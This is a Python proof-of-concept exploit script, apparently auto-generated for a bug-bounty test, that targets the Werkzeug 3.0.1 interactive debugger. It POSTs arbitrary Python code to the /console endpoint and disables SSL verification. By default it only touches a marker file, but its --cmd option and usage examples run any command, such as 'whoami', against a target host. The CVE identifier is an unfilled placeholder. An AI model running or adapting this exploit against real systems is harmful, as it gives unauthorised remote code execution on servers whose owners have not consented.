#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: rce-001
# Sink: eval
# Auto-generated — run with: python3 rce_python_code_execution_eval_eval.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for werkzeug debugger RCE (CVE-2023-XXXX).
Target: werkzeug 3.0.1 interactive debugger console.

The debugger's /console endpoint accepts arbitrary Python code via the 'code'
parameter and passes it directly to eval() without authentication or sanitization.
This allows remote code execution when the debugger is enabled.

Usage:
    python3 exploit.py --target http://target:port
    python3 exploit.py --target http://target:port --cmd "id"
"""

import argparse
import sys
import urllib.parse
import urllib.request
import urllib.error
import ssl
import time

def exploit(target_url, command=None):
    """
    Send a Python command to the werkzeug debugger console endpoint.
    
    Args:
        target_url: Base URL of the target (e.g., http://localhost:5000)
        command: Python code to execute (default: benign touch command)
    
    Returns:
        Response text from the server
    """
    # Default benign payload - creates a file to confirm RCE
    if command is None:
        command = "__import__('os').system('touch /tmp/poc_success.txt')"
    
    # The debugger console endpoint
    console_url = urllib.parse.urljoin(target_url.rstrip('/') + '/', 'console')
    
    # Prepare the POST data
    data = urllib.parse.urlencode({'code': command}).encode('utf-8')
    
    # Create request with proper headers
    req = urllib.request.Request(
        console_url,
        data=data,
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (PoC-Exploit)'
        },
        method='POST'
    )
    
    # Disable SSL verification for testing (use with caution)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    try:
        print(f"[*] Sending exploit to {console_url}")
        print(f"[*] Payload: {command}")
        
        with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
            result = response.read().decode('utf-8', errors='replace')
            print(f"[+] Server responded with status {response.status}")
            return result
            
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        if e.code == 404:
            print("[-] Debugger console endpoint not found. Is the debugger enabled?")
        elif e.code == 403:
            print("[-] Access forbidden. The debugger might be protected.")
        else:
            print(f"[-] Response body: {e.read().decode('utf-8', errors='replace')}")
        return None
        
    except urllib.error.URLError as e:
        print(f"[-] URL Error: {e.reason}")
        print("[-] Check if the target is reachable and the debugger is enabled.")
        return None
        
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(
        description='Werkzeug Debugger RCE Exploit PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target http://localhost:5000
  %(prog)s --target http://192.168.1.100:8080 --cmd "import os; os.system('whoami')"
        """
    )
    
    parser.add_argument(
        '--target', '-t',
        required=True,
        help='Target URL (e.g., http://localhost:5000)'
    )
    
    parser.add_argument(
        '--cmd', '-c',
        help='Python code to execute (default: touch /tmp/poc_success.txt)',
        default=None
    )
    
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Show detailed output'
    )
    
    args = parser.parse_args()
    
    print("[*] Werkzeug Debugger RCE Exploit PoC")
    print("[*] Target:", args.target)
    print("[*] Command:", args.cmd or "touch /tmp/poc_success.txt (default)")
    print()
    
    result = exploit(args.target, args.cmd)
    
    if result:
        print("\n[+] Exploit successful!")
        print("[+] Server response:")
        print("-" * 50)
        print(result)
        print("-" * 50)
        
        # Verify the default payload worked
        if args.cmd is None:
            print("\n[*] Checking if /tmp/poc_success.txt was created...")
            check_cmd = "__import__('os').path.exists('/tmp/poc_success.txt')"
            check_result = exploit(args.target, check_cmd)
            if check_result and 'True' in check_result:
                print("[+] File /tmp/poc_success.txt exists - RCE confirmed!")
            else:
                print("[-] Could not verify file creation. Check manually.")
    else:
        print("\n[-] Exploit failed.")
        sys.exit(1)

if __name__ == '__main__':
    main()
